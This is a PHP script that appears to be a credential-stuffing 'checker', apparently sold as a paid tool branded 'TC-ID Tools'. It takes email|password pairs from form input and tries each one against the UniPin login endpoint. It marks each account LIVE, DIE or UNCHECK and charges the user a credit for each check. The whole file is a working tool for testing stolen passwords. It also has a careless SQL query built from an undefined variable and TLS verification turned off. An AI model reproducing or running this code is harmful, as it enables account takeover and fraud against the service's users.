<?php
session_start();
error_reporting(0); 
?>
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'includes/class_curl.php';
if (isset($format)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}

$dir                   = dirname(__FILE__);
$config = $dir . '/_cook/' .rand(1,999999999999999). '.txt';
if (!file_exists($config)) {
    $fp = @fopen($config, 'w');
    @fclose($fp);
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://www.unipin.co.id/member/index/login/format/json');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
        curl_setopt($ch,CURLOPT_POST,TRUE);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,TRUE);
        curl_setopt($ch,CURLOPT_COOKIEFILE, $config);
        curl_setopt($ch,CURLOPT_COOKIEJAR,  $config);
curl_setopt($ch,CURLOPT_POSTFIELDS,"login_email=$pisah[0]&login_password=$pisah[1]");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result = curl_exec($ch);
                if(empty($result)){
                        die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		} else if (preg_match('/invalid/i',$result)) {
                        $hasil['error'] = 2;
			$hasil['msg'] = '<font color=red><b>DIE</b></font> | '.$pisah[0].' | '.$pisah[1].' ';
			die(json_encode($hasil));
		} else {
mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
			die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' ./TC-ID Tools"}');
		}
	
}
?>